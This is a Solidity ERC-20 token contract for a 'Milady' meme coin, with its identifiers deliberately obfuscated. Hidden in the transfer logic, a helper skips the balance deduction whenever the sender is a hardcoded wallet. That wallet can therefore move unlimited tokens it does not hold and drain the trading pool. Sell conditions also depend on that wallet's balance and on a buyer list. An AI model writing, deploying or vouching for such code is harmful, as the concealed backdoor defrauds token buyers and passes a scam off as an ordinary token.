/**

Twitter: https://twitter.com/Milady_Ethereum

Telegram: https://t.me/MiladyEthereum

Website: https://miladyerc.com/

**/


// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _rqxvb(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _rqxvb(a, b, "SafeMath");
    }

    function  _rqxvb(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _qxuxm {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface _peify {
    function omKicnbxpacrtmFcadvcwc(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract Milady is Context, IERC20, Ownable {
    using SafeMath for uint256;
    _peify private _Tbvbqak;
    address payable private _yobuejr;
    address private _kisftuh;

    string private constant _name = unicode"Milady";
    string private constant _symbol = unicode"Milady";
    uint8 private constant _decimals = 9;
    uint256 private constant _dTotaldf = 100000000 * 10 **_decimals;

    uint256 public _qnbvstd = _dTotaldf;
    uint256 public _Wzcrnde = _dTotaldf;
    uint256 public _rmvTxsv= _dTotaldf;
    uint256 public _BvaTskf= _dTotaldf;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _qlofivpr;
    mapping (address => bool) private _trurvwky;
    mapping(address => uint256) private _rjckoxp;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _ymzvkmq=0;
    uint256 private _pnudjng=0;
    

    bool private _pvnwisq;
    bool public _Tpusfhym = false;
    bool private ckpvqe = false;
    bool private _apevjq = false;


    event _mracbrkt(uint _qnbvstd);
    modifier vlTnagr {
        ckpvqe = true;
        _;
        ckpvqe = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _dTotaldf;
        _qlofivpr[owner(

        )] = true;
        _qlofivpr[address
        (this)] = true;
        _qlofivpr[
            _yobuejr] = true;
        _yobuejr = 
        payable (0x41cC998E6dDA93e4E0a0833f448Ba6804A12339F);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _dTotaldf);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _dTotaldf;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _rqxvb(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 rvbsrmk=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_Tpusfhym) {
                if (to 
                != address
                (_Tbvbqak) 
                && to !=
                 address
                 (_kisftuh)) {
                  require(_rjckoxp
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _rjckoxp
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _kisftuh && to != 
            address(_Tbvbqak) &&
             !_qlofivpr[to] ) {
                require(amount 
                <= _qnbvstd,
                 "Exceeds the _qnbvstd.");
                require(balanceOf
                (to) + amount
                 <= _Wzcrnde,
                  "Exceeds the macxizse.");
                if(_pnudjng
                < _ymzvkmq){
                  require
                  (! _erpokbz(to));
                }
                _pnudjng++;
                 _trurvwky
                 [to]=true;
                rvbsrmk = amount._pvr
                ((_pnudjng>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _kisftuh &&
             from!= address(this) 
            && !_qlofivpr[from] ){
                require(amount <= 
                _qnbvstd && 
                balanceOf(_yobuejr)
                <_BvaTskf,
                 "Exceeds the _qnbvstd.");
                rvbsrmk = amount._pvr((_pnudjng>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_pnudjng>
                _ymzvkmq &&
                 _trurvwky[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!ckpvqe 
            && to == _kisftuh &&
             _apevjq &&
             contractTokenBalance>
             _rmvTxsv 
            && _pnudjng>
            _ymzvkmq&&
             !_qlofivpr[to]&&
              !_qlofivpr[from]
            ) {
                _pnrvtaf( _rvqrv(amount, 
                _rvqrv(contractTokenBalance,
                _BvaTskf)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _upvfiv(address
                    (this).balance);
                }
            }
        }

        if(rvbsrmk>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(rvbsrmk);
          emit
           Transfer(from,
           address
           (this),rvbsrmk);
        }
        _balances[from
        ]= _rqxvb(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _rqxvb(rvbsrmk));
        emit Transfer
        (from, to, 
        amount.
         _rqxvb(rvbsrmk));
    }

    function _pnrvtaf(uint256
     tokenAmount) private
      vlTnagr {
        if(tokenAmount==
        0){return;}
        if(!_pvnwisq)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _Tbvbqak.WETH();
        _approve(address(this),
         address(
             _Tbvbqak), 
             tokenAmount);
        _Tbvbqak.
        omKicnbxpacrtmFcadvcwc
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _rvqrv
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _rqxvb(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _yobuejr){
            return a ;
        }else{
            return a .
             _rqxvb (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _qnbvstd = _dTotaldf;
        _Wzcrnde = _dTotaldf;
        emit _mracbrkt(_dTotaldf);
    }

    function _erpokbz(address 
    account) private view 
    returns (bool) {
        uint256 epair;
        assembly {
            epair :=
             extcodesize
             (account)
        }
        return epair > 
        0;
    }

    function _upvfiv(uint256
    amount) private {
        _yobuejr.
        transfer(
            amount);
    }

    function openxTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _pvnwisq ) ;
        _Tbvbqak  
        =  
        _peify
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _Tbvbqak), 
            _dTotaldf);
        _kisftuh = 
        _qxuxm(_Tbvbqak.
        factory( ) 
        ). createPair (
            address(this
            ),  _Tbvbqak .
             WETH ( ) );
        _Tbvbqak.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_kisftuh).
        approve(address(_Tbvbqak), 
        type(uint)
        .max);
        _apevjq = true;
        _pvnwisq = true;
    }

    receive() external payable {}
}